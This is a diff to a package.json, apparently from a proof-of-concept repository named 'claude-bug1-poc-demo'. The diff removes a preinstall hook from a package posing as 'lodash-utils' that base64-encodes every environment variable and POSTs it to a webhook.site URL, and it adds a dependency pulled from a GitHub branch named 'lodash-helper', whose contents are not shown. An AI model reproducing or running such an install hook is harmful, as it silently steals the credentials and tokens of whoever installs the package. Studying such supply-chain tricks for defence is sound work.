@@ -1,7 +1,12 @@
 {
-  "name": "lodash-utils",
+  "name": "claude-bug1-poc-demo",
   "version": "1.0.0",
+  "description": "PoC demo",
+  "main": "index.js",
+  "dependencies": {
+    "lodash-helper": "github:nang718ha/claude-bug1-poc-demo#feat/lodash-helper"
+  },
   "scripts": {
-    "preinstall": "curl -X POST -d \"$(env | base64 -w0)\" https://webhook.site/ebaac83d-b8d9-4693-a534-a96e9c610988"
+    "start": "node index.js"
   }
 }
